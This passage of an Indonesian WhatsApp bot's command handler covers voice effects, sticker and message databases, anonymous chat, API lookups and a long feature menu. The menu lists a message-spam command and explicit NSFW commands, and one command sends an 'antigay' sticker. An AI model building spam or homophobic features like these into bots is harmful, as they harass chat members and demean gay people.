                if (/tupai/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                m.reply(mess.wait)
                let media = await satria.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                satria.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : fdoc })
                fs.unlinkSync(ran)
                })
                } else m.reply(`Balas audio yang ingin diubah dengan caption *${prefix + command}*`)
                } catch (e) {
                m.reply(e)
                }
                break
            case 'setcmd': {
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                if (!text) throw `Untuk Command Apa?`
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
                global.db.data.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                m.reply(`Done!`)
            }
            break
            case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) throw `Tidak ada hash`
                if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to delete this sticker command'              
                delete global.db.data.sticker[hash]
                m.reply(`Done!`)
            }
            break
            case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.data.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                satria.sendText(m.chat, teks, m, { mentions: Object.values(global.db.data.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break
            case 'lockcmd': {
                if (!isCreator) throw mess.owner
                if (!m.quoted) throw 'Reply Pesan!'
                if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.data.sticker)) throw 'Hash not found in database'
                global.db.data.sticker[hash].locked = !/^un/i.test(command)
                m.reply('Done!')
            }
            break
            case 'addmsg': {
                if (!m.quoted) throw 'Reply Message Yang Ingin Disave Di Database'
                if (!text) throw `Example : ${prefix + command} nama file`
                let msgs = global.db.data.database
                if (text.toLowerCase() in msgs) throw `'${text}' telah terdaftar di list pesan`
                msgs[text.toLowerCase()] = quoted.fakeObj
reply(`Berhasil menambahkan pesan di list pesan sebagai '${text}'
    
Akses dengan ${prefix}getmsg ${text}

Lihat list Pesan Dengan ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
                let msgs = global.db.data.database
                if (!(text.toLowerCase() in msgs)) throw `'${text}' tidak terdaftar di list pesan`
                satria.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./src/database.json'))
	        let seplit = Object.entries(global.db.data.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = '「 LIST DATABASE 」\n\n'
		for (let i of seplit) {
		    teks += `⬡ *Name :* ${i.nama}\n⬡ *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        m.reply(teks)
	    }
	    break
            case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.data.database
	        if (!(text.toLowerCase() in msgs)) return m.reply(`'${text}' tidak terdaftar didalam list pesan`)
		delete msgs[text.toLowerCase()]
		reply(`Berhasil menghapus '${text}' dari list pesan`)
            }
	    break
	    case 'anonymous': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
				this.anonymous = this.anonymous ? this.anonymous : {}
				let buttons = [
                    { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                ]
                satria.sendButtonText(m.chat, buttons, `\`\`\`Hi ${await satria.getName(m.sender)} Welcome To Anonymous Chat\n\nKlik Button Dibawah Ini Untuk Mencari Partner\`\`\``, global.footer, m)
            }
			break
            case 'keluar': case 'leave': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let room = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!room) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await satria.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner \`\`\``)
                    throw false
                }
                m.reply('Ok')
                let other = room.other(m.sender)
                if (other) await satria.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[room.id]
                if (command === 'leave') break
            }
            case 'mulai': case 'start': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                if (Object.values(this.anonymous).find(room => room.check(m.sender))) {
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await satria.sendButtonText(m.chat, buttons, `\`\`\`Kamu Masih Berada Di dalam Sesi Anonymous, Tekan Button Dibawah Ini Untuk Menghentikan Sesi Anonymous Anda\`\`\``, global.footer, m)
                    throw false
                }
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await satria.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, global.footer, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await satria.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, global.footer, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await satria.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, global.footer, m)
                }
                break
            }
            case 'next': case 'lanjut': {
                if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
                this.anonymous = this.anonymous ? this.anonymous : {}
                let romeo = Object.values(this.anonymous).find(room => room.check(m.sender))
                if (!romeo) {
                    let buttons = [
                        { buttonId: 'start', buttonText: { displayText: 'Start' }, type: 1 }
                    ]
                    await satria.sendButtonText(m.chat, buttons, `\`\`\`Kamu Sedang Tidak Berada Di Sesi Anonymous, Tekan Button Untuk Mencari Partner\`\`\``)
                    throw false
                }
                let other = romeo.other(m.sender)
                if (other) await satria.sendText(other, `\`\`\`Partner Telah Meninggalkan Sesi Anonymous\`\`\``, m)
                delete this.anonymous[romeo.id]
                let room = Object.values(this.anonymous).find(room => room.state === 'WAITING' && !room.check(m.sender))
                if (room) {
                    let buttons = [
                        { buttonId: 'next', buttonText: { displayText: 'Skip' }, type: 1 },
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await satria.sendButtonText(room.a, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, global.footer, m)
                    room.b = m.sender
                    room.state = 'CHATTING'
                    await satria.sendButtonText(room.b, buttons, `\`\`\`Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan\`\`\``, global.footer, m)
                } else {
                    let id = + new Date
                    this.anonymous[id] = {
                        id,
                        a: m.sender,
                        b: '',
                        state: 'WAITING',
                        check: function (who = '') {
                            return [this.a, this.b].includes(who)
                        },
                        other: function (who = '') {
                            return who === this.a ? this.b : who === this.b ? this.a : ''
                        },
                    }
                    let buttons = [
                        { buttonId: 'keluar', buttonText: { displayText: 'Stop' }, type: 1 }
                    ]
                    await satria.sendButtonText(m.chat, buttons, `\`\`\`Mohon Tunggu Sedang Mencari Partner\`\`\``, global.footer, m)
                }
                break
            }
            case 'public': {
                if (!isCreator) throw mess.owner
                satria.public = true
                m.reply('Sukse Change To Public Usage')
            }
            break
            case 'self': {
                if (!isCreator) throw mess.owner
                satria.public = false
                m.reply('Sukses Change To Self Usage')
            }
            break
            case 'ping': case 'botstatus': case 'statusbot': {
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon)
            }
            break
            case 'speedtest': {
            m.reply('Testing Speed...')
            let cp = require('child_process')
            let { promisify } = require('util')
            let exec = promisify(cp.exec).bind(cp)
          let o
          try {
          o = await exec('python speed.py')
          } catch (e) {
          o = e
         } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) m.reply(stdout)
        if (stderr.trim()) m.reply(stderr)
            }
            }
            break
            case 'owner': case 'creator': {
                satria.sendContact(m.chat, global.owner, m)
                await sleep(100)
                let btn = [{
                                urlButton: {
                                    displayText: 'Website',
                                    url: global.web
                                  }
                                },{
                                	urlButton: {
                                    displayText: 'Github',
                                    url: 'https://github.com/SatzzBotzz'
                                    }
                                    },{
                                    quickReplyButton: {
                                    displayText: 'Menu',
                                    id: 'menu'
                                    }  
                                }]
	satria.send5ButImg(m.chat,`${ucapanWaktu} - ${tagsender} \n\n itu owner ku, ingin tau lebih banyak?`, `© satria`, thumb, btn)
            }
            break
            case 'playstore': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
            if (!text) throw `Example : ${prefix + command} clash of clans`
            let res = await fetchJson(api('zenz', '/webzone/playstore', { query: text }, 'apikey'))
            let teks = `⭔ Playstore Search From : ${text}\n\n`
            for (let i of res.result) {
            teks += `⭔ Name : ${i.name}\n`
            teks += `⭔ Link : ${i.link}\n`
            teks += `⭔ Developer : ${i.developer}\n`
            teks += `⭔ Link Developer : ${i.link_dev}\n\n──────────────────────\n`
            }
            m.reply(teks)
            }
            break
            case 'gsmarena': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
            if (!text) throw `Example : ${prefix + command} samsung`
            let res = await fetchJson(api('zenz', '/webzone/gsmarena', { query: text }, 'apikey'))
            let { judul, rilis, thumb, ukuran, type, storage, display, inchi, pixel, videoPixel, ram, chipset, batrai, merek_batre, detail } = res.result
let capt = `⭔ Title: ${judul}
⭔ Realease: ${rilis}
⭔ Size: ${ukuran}
⭔ Type: ${type}
⭔ Storage: ${storage}
⭔ Display: ${display}
⭔ Inchi: ${inchi}
⭔ Pixel: ${pixel}
⭔ Video Pixel: ${videoPixel}
⭔ Ram: ${ram}
⭔ Chipset: ${chipset}
⭔ Battery: ${batrai}
⭔ Battery Brand: ${merek_batre}
⭔ Detail: ${detail}`
            satria.sendImage(m.chat, thumb, capt, m)
            }
            break
            case 'jadwalbioskop': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
            if (!text) throw `Example: ${prefix + command} jakarta`
            let res = await fetchJson(api('zenz', '/webzone/jadwalbioskop', { kota: text }, 'apikey'))
            let capt = `Jadwal Bioskop From : ${text}\n\n`
            for (let i of res.result){
            capt += `⭔ Title: ${i.title}\n`
            capt += `⭔ thumbnail: ${i.thumb}\n`
            capt += `⭔ Url: ${i.url}\n\n──────────────────────\n`
            }
            satria.sendImage(m.chat, res.result[0].thumb, capt, m)
            }
            break
            case 'nowplayingbioskop': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
            let res = await fetchJson(api('zenz', '/webzone/nowplayingbioskop', {}, 'apikey'))
            let capt = `Now Playing Bioskop\n\n`
            for (let i of res.result){
            capt += `⭔ Title: ${i.title}\n`
            capt += `⭔ Url: ${i.url}\n`
            capt += `⭔ Img Url: ${i.img}\n\n──────────────────────\n`
            }
            satria.sendImage(m.chat, res.result[0].img, capt, m)
            }
            break
            case 'aminio': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
            if (!text) throw `Example: ${prefix + command} free fire`
            let res = await fetchJson(api('zenz', '/webzone/amino', { query: text }, 'apikey'))
            let capt = `Amino Search From : ${text}\n\n`
            for (let i of res.result){
            capt += `⭔ Community: ${i.community}\n`
            capt += `⭔ Community Link: ${i.community_link}\n`
            capt += `⭔ thumbnail: ${i.community_thumb}\n`
            capt += `⭔ Description: ${i.community_desc}\n`
            capt += `⭔ Member Count: ${i.member_count}\n\n──────────────────────\n`
            }
            satria.sendImage(m.chat, 'https://'+res.result[0].community_thumb, capt, m)
            }
            break
            case 'wattpad': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/wattpad', { query: text }, 'apikey'))
            let { judul, dibaca, divote, bab, waktu, url, thumb, description } = res.result[0]
            let capt = `Wattpad From ${text}\n\n`
            capt += `⭔ Judul: ${judul}\n`
            capt += `⭔ Dibaca: ${dibaca}\n`
            capt += `⭔ Divote: ${divote}\n`
            capt += `⭔ Bab: ${bab}\n`
            capt += `⭔ Waktu: ${waktu}\n`
            capt += `⭔ Url: ${url}\n`
            capt += `⭔ Deskripsi: ${description}`
            satria.sendImage(m.chat, thumb, capt, m)
            }
            break
            case 'webtoons': {
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/webtoons', { query: text }, 'apikey'))
            let capt = `Webtoons Search From : ${text}\n\n`
            for (let i of res.result) {
            capt += `⭔ Judul: ${i.judul}\n`
            capt += `⭔ Like: ${i.like}\n`
            capt += `⭔ Creator: ${i.creator}\n`
            capt += `⭔ Genre: ${i.genre}\n`
            capt += `⭔ Url: ${i.url}\n\n──────────────────────\n`
            }
            m.reply(capt)
            }
            break
            case 'drakor': {
if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
            if (!text) throw `Example : ${prefix + command} love`
            let res = await fetchJson(api('zenz', '/webzone/drakor', { query: text }, 'apikey'))
            let capt = `Drakor Search From : ${text}\n\n`
            for (let i of res.result) {
            capt += `⭔ Judul: ${i.judul}\n`
            capt += `⭔ Years: ${i.years}\n`
            capt += `⭔ Genre: ${i.genre}\n`
            capt += `⭔ Url: ${i.url}\n`
            capt += `⭔ thumbnail Url: ${i.thumbnail}\n\n──────────────────────\n`
            }
            satria.sendImage(m.chat, res.result[0].thumbnail, capt, m)
            }
            break
            case 'setmenu': {
            if (!isCreator) throw mess.owner
            let setbot = db.data.settings[botNumber]
               if (args[0] === 'templateImage'){
                setbot.templateImage = true
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateVideo'){
                setbot.templateImage = false
                setbot.templateVideo = true
                setbot.templateGif = false
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateGif'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = true
                setbot.templateMsg = false
                m.reply(mess.success)
                } else if (args[0] === 'templateMessage'){
                setbot.templateImage = false
                setbot.templateVideo = false
                setbot.templateGif = false
                setbot.templateMsg = true
                m.reply(mess.success)
                } else {
                let sections = [
                {
title: "CHANGE MENU BOT",
                rows: [
{title: "Template Image", rowId: `setmenu templateImage`, description: `Change menu bot to Template Image`},
{title: "Template Video", rowId: `setmenu templateVideo`, description: `Change menu bot to Template Video`},
{title: "Template Gif", rowId: `setmenu templateGif`, description: `Change menu bot to Template Gif`},
{title: "Template Message", rowId: `setmenu templateMessage`, description: `Change menu bot to Template Message`}
                ]
                },
                ]
                satria.sendListMsg(m.chat, `Please select the menu you want to change!`, global.footer, `Hello Owner !`, `Click Here`, sections, m)
                }
            }
            break
break
case 'fiturlist': {
 {
                let sccod = [
                {
title: "List Menu",
                rows: [
{title: "Menu Group", rowId: `mn1`, description: `Show Menu Group`},
{title: "Menu Main", rowId: `mn2`, description: `Show Menu Main`},
{title: "Menu Owner", rowId: `mn3`, description: `Show Menu Owner`},
{title: "Menu Webzone", rowId: `mn4`, description: `Show Menu Webzone`},
{title: "Menu Downloader", rowId: `mn5`, description: `Show Menu Downloader`},
{title: "Menu Search", rowId: `mn6`, description: `Show Menu Search`},
{title: "Menu Random", rowId: `mn7`, description: `Show Menu Random`},
{title: "Menu Textpro", rowId: `mn8`, description: `Show Menu Textpro`},
{title: "Menu Photooxy", rowId: `mn9`, description: `Show Menu Photooxy`},
{title: "Menu Ephoto", rowId: `mn10`, description: `Show Menu Ephoto`},
{title: "Menu Fun", rowId: `mn11`, description: `Show Menu Fun`},
{title: "Menu Primbon", rowId: `mn12`, description: `Show Menu Primbon`},
{title: "Menu Convert", rowId: `mn1`, description: `Show Menu Convert`},
{title: "Menu Database", rowId: `mn14`, description: `Show Menu Database`},
{title: "Menu Anonymous", rowId: `mn15`, description: `Show Menu Anonymous`},
{title: "Menu Islamic", rowId: `mn16`, description: `Show Menu Islamic`},
{title: "Menu Voice", rowId: `mn17`, description: `Show Menu Voice`}
                ]
                },
                ]
                satria.sendListMsg(m.chat, `Saya Bot Dari ${ownername} ini adalah List Menu Bot Whatsapp Simple !!`, `© Created By ${ownername}`, `Hai ${pushname}👋 *Selamat ${ucapanWaktu}*`, `Click Here`, sccod, m)
                }
            }
            break
            case 'list': case 'menu': case 'help': case '?': {
                anu = `${ucapanWaktu} ${tagsender} 👋\n\n
Saya *${botname}*, Bot Ini Adalah Beta Multi-Device WhatsApp.
Jika Ada Fitur Error Atau Bug Segera Lapor Ke Owner Bot.

Date : ${salam}

╭─❒ 「 Bot Info 」 
├ ${prefix}owner
├ ${prefix}sc
╰❒ ${prefix}donate


╭─❒ 「 Group Menu 」
├ ${prefix}linkgroup
├ ${prefix}ephemeral [option]
├ ${prefix}setppgc [image]
├ ${prefix}setname [text]
├ ${prefix}setdesc [text]
├ ${prefix}group [option]
├ ${prefix}editinfo [option]
├ ${prefix}add @user
├ ${prefix}kick @user
├ ${prefix}hidetag [text]
├ ${prefix}tagall [text]
├ ${prefix}antilink [on/off]
├ ${prefix}mute [on/off]
├ ${prefix}promote @user
├ ${prefix}demote @user
├ ${prefix}vote [text]
├ ${prefix}devote
├ ${prefix}upvote
├ ${prefix}cekvote
├ ${prefix}hapusvote
╰❒


╭─❒ 「 Main Menu 」
├ ${prefix}request
├ ${prefix}report
├ ${prefix}ping
├ ${prefix}owner
├ ${prefix}menu
├ ${prefix}help
├ ${prefix}delete
├ ${prefix}infochat
├ ${prefix}quoted
├ ${prefix}listpc
├ ${prefix}listgc
├ ${prefix}listonline
├ ${prefix}speedtest
├ ${prefix}cekprem
├ ${prefix}ceklimit
├ ${prefix}cekwarning
├ ${prefix}cek
╰❒


╭─❒ 「 Owner Menu 」
├ ${prefix}react [emoji]
├ ${prefix}chat [option]
├ ${prefix}join [link]
├ ${prefix}leave
├ ${prefix}block @user
├ ${prefix}unblock @user
├ ${prefix}bcgroup [text]
├ ${prefix}bcall [text]
├ ${prefix}setppbot [image]
├ ${prefix}setexif
├ ${prefix}setmenu [option]
╰❒


╭─❒ 「 Webzone Menu 」
├ ${prefix}playstore
├ ${prefix}gsmarena
├ ${prefix}jadwalbioskop
├ ${prefix}nowplayingbioskop
├ ${prefix}aminio
├ ${prefix}wattpad
├ ${prefix}webtoons
├ ${prefix}drakor
╰❒


╭─❒ 「 Downloader Menu 」
├ ${prefix}tiktoknowm [url]
├ ${prefix}tiktokwm [url]
├ ${prefix}tiktokmp3 [url]
├ ${prefix}instagram [url]
├ ${prefix}twitter [url]
├ ${prefix}twittermp3 [url]
├ ${prefix}facebook [url]
├ ${prefix}pinterestdl [url]
├ ${prefix}ytmp3 [url]
├ ${prefix}ytmp4 [url]
├ ${prefix}getmusic [query]
├ ${prefix}getvideo [query]
├ ${prefix}umma [url]
├ ${prefix}joox [query]
├ ${prefix}soundcloud [url]
╰❒


╭─❒ 「 Search Menu 」
├ ${prefix}play [query]
├ ${prefix}yts [query]
├ ${prefix}google [query]
├ ${prefix}gimage [query]
├ ${prefix}pinterest [query]
├ ${prefix}wallpaper [query]
├ ${prefix}wikimedia [query]
├ ${prefix}ytsearch [query]
├ ${prefix}ringtone [query]
├ ${prefix}stalk [option] [query]
╰❒


╭─❒ 「 Random Menu 」
├ ${prefix}chat
├ ${prefix}spam
├ ${prefix}coffe
├ ${prefix}quotesanime
├ ${prefix}motivasi
├ ${prefix}dilanquote
├ ${prefix}bucinquote
├ ${prefix}katasenja
├ ${prefix}puisi
├ ${prefix}pantun
├ ${prefix}cerpen
├ ${prefix}cersex
├ ${prefix}couple
├ ${prefix}anime
├ ${prefix}waifu
├ ${prefix}husbu
├ ${prefix}neko
├ ${prefix}shinobu
├ ${prefix}waifus (nsfw)
├ ${prefix}nekos (nsfw)
├ ${prefix}trap (nsfw)
├ ${prefix}blowjob (nsfw)
├ ${prefix}nekopoi
├ ${prefix}wamod
├ ${prefix}chat
╰❒



╭─❒ 「 Textpro Menu 」
├ ${prefix}3dchristmas
├ ${prefix}3ddeepsea
├ ${prefix}americanflag
├ ${prefix}3dscifi
├ ${prefix}3drainbow
├ ${prefix}3dwaterpipe
├ ${prefix}halloweenskeleton
├ ${prefix}sketch
├ ${prefix}bluecircuit
├ ${prefix}space
├ ${prefix}metallic
├ ${prefix}fiction
├ ${prefix}greenhorror
├ ${prefix}transformer
├ ${prefix}berry
├ ${prefix}thunder
├ ${prefix}magma
├ ${prefix}3dcrackedstone
├ ${prefix}3dneonlight
├ ${prefix}impressiveglitch
├ ${prefix}naturalleaves
├ ${prefix}fireworksparkle
├ ${prefix}matrix
├ ${prefix}dropwater
├ ${prefix}harrypotter
├ ${prefix}foggywindow
├ ${prefix}neondevils
├ ${prefix}christmasholiday
├ ${prefix}3dgradient
├ ${prefix}blackpink
├ ${prefix}gluetext
╰❒


 ╭─❒ 「Photo Oxy Menu 」
├ ${prefix}shadow
├ ${prefix}romantic
├ ${prefix}smoke
├ ${prefix}burnpapper
├ ${prefix}naruto
├ ${prefix}lovemsg
├ ${prefix}grassmsg
├ ${prefix}lovetext
├ ${prefix}coffecup
├ ${prefix}butterfly
├ ${prefix}harrypotter
├ ${prefix}retrolol
╰❒


╭─❒ 「 Ephoto Menu 」
├ ${prefix}ffcover
├ ${prefix}crossfire
├ ${prefix}galaxy
├ ${prefix}glass
├ ${prefix}neon
├ ${prefix}beach
├ ${prefix}blackpink
├ ${prefix}igcertificate
├ ${prefix}ytcertificate
╰❒


╭─❒ 「 Fun Menu 」
├ ${prefix}simih
├ ${prefix}halah
├ ${prefix}hilih
├ ${prefix}huluh
├ ${prefix}heleh
├ ${prefix}holoh
├ ${prefix}jadian
├ ${prefix}jodohku
├ ${prefix}delttt
├ ${prefix}tictactoe
├ ${prefix}family100
├ ${prefix}tebak [option]
├ ${prefix}math [mode]
├ ${prefix}suitpvp [@tag]
╰❒


╭─❒ 「 Primbon Menu 」
├ ${prefix}nomorhoki
├ ${prefix}artimimpi
├ ${prefix}artinama
├ ${prefix}ramaljodoh
├ ${prefix}ramaljodohbali
├ ${prefix}suamiistri
├ ${prefix}ramalcinta
├ ${prefix}cocoknama
├ ${prefix}pasangan
├ ${prefix}jadiannikah
├ ${prefix}sifatusaha
├ ${prefix}rezeki
├ ${prefix}pekerjaan
├ ${prefix}nasib
├ ${prefix}penyakit
├ ${prefix}tarot
├ ${prefix}fengshui
├ ${prefix}haribaik
├ ${prefix}harisangar
├ ${prefix}harisial
├ ${prefix}nagahari
├ ${prefix}arahrezeki
├ ${prefix}peruntungan
├ ${prefix}weton
├ ${prefix}karakter
├ ${prefix}keberuntungan
├ ${prefix}memancing
├ ${prefix}masasubur
├ ${prefix}zodiak
├ ${prefix}shio
╰❒


╭─❒ 「 Confert Menu 」
├ ${prefix}attp
├ ${prefix}ttp
├ ${prefix}toimage
├ ${prefix}removebg
├ ${prefix}sticker
├ ${prefix}emojimix
├ ${prefix}emojimix2
├ ${prefix}tovideo
├ ${prefix}togif
├ ${prefix}tourl
├ ${prefix}tovn
├ ${prefix}tomp3
├ ${prefix}toaudio
├ ${prefix}ebinary
├ ${prefix}dbinary
├ ${prefix}styletext
├ ${prefix}smeme
╰❒


╭─❒ 「 Database Menu 」
├ ${prefix}setcmd
├ ${prefix}listcmd
├ ${prefix}delcmd
├ ${prefix}lockcmd
├ ${prefix}addmsg
├ ${prefix}listmsg
├ ${prefix}getmsg
├ ${prefix}delmsg
╰❒


╭─❒ 「 Anonymous Menu 」
├ ${prefix}anonymous
├ ${prefix}start
├ ${prefix}next
├ ${prefix}keluar
╰❒


╭─❒ 「 Islamic Menu 」
├ ${prefix}iqra
├ ${prefix}hadist
├ ${prefix}alquran
├ ${prefix}juzamma
├ ${prefix}tafsirsurah
╰❒
 
 
╭─❒ 「 Voice Changer Menu 」
├ ${prefix}bass
├ ${prefix}blown
├ ${prefix}deep
├ ${prefix}earrape
├ ${prefix}fast
├ ${prefix}fat
├ ${prefix}nightcore
├ ${prefix}reverse
├ ${prefix}robot
├ ${prefix}slow
├ ${prefix}tupai
╰❒

╭─❒ 「 New Menu 」
├ ${prefix}ppkul
├ ${prefix}waifu
├ ${prefix}cosplay
├ ${prefix}creepyfact
├ ${prefix}faktaunik
├ ${prefix}jawaquote
├ ${prefix}kanyequote
├ ${prefix}kannagen
├ ${prefix}pooh
├ ${prefix}tahta
├ ${prefix}sadcat
├ ${prefix}tweetmaker
├ ${prefix}asupan
╰❒
`
                let btn = [{
                                urlButton: {
                                    displayText: 'Website',
                                    url: global.web
                                }
                            },{
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: '.ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: '.owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'Rent Bots',
                                    id: '.sewa'
                                }
                            }]
                         let setbot = db.data.settings[botNumber]
                        if (setbot.templateImage) {
                        satria.send5ButImg(m.chat, anu, global.footer, thumb, btn, { quoted : floc })
                        } else if (setbot.templateGif) {
                        satria.send5ButGif(m.chat, anu, global.footer, visoka, btn, { quoted : floc })
                        } else if (setbot.templateVid) {
                        satria.send5ButVid(m.chat, anu, global.footer, vitum, btn, { quoted : floc })
                        } else if (setbot.templateMsg) {
                        satria.send5ButMsg(m.chat, anu, `© Created By Satganz DevDevs`, btn, { quoted : floc })
                        }
                     }
            break
            	case 'igy':{
            	media = fs.readFileSync('./src/antigay.png')
            	satria.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
            }
            break
            case 'asupan':{
            	if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
            	let buttons = [
                    {buttonId: `.asupan`, buttonText: {displayText: 'Next'}, type: 1}
                ]
